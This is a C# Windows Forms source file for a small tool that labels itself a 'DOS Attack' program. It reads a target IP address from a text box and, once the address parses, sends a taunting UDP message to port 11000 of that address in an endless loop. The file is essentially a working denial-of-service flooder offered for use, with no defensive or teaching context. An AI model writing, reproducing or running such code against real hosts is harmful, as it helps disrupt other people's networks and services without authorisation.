using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;

namespace MoonEyE
{
    
    public partial class Form1 : Form
    {
        



        public Form1()
        {
            InitializeComponent();
            
            
        }

        private void targetTb_TextChanged(object sender, EventArgs e)
        {

        }

        public void pictureBox1_Click(object sender, EventArgs e)
        {

            string ipTarget = targetTb.Text;
            MessageBox.Show("Loading data...", "DOS Attack", MessageBoxButtons.OKCancel, MessageBoxIcon.Information ) ;
            
            IPAddress ip;
            string ip2 = ipTarget;
            bool ValidateIP = IPAddress.TryParse(ip2, out ip);
            if (ValidateIP)
            {

                MessageBox.Show("IP is valide", "Correct", MessageBoxButtons.OK, MessageBoxIcon.Information);
                MessageBox.Show("Durring attack, to stop close a window!", "DOS Attack", MessageBoxButtons.OK, MessageBoxIcon.Information);


                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                IPAddress serverAddr = IPAddress.Parse(ipTarget);
                IPEndPoint endPoint = new IPEndPoint(serverAddr, 11000);
                string text = "Dark-B Says Hi <3 How is your ping i think is good, the person who DOS you is maybe near, have a good day bye!";
                byte[] send_buffer = Encoding.ASCII.GetBytes(text);


                while (true)
                {
                    sock.SendTo(send_buffer, endPoint);
                }
            }




            else
            {
                MessageBox.Show("IP is invalide", "Failure", MessageBoxButtons.OK, MessageBoxIcon.Error);
                targetTb.Text = "";
            }





            

        }
        
    }
}
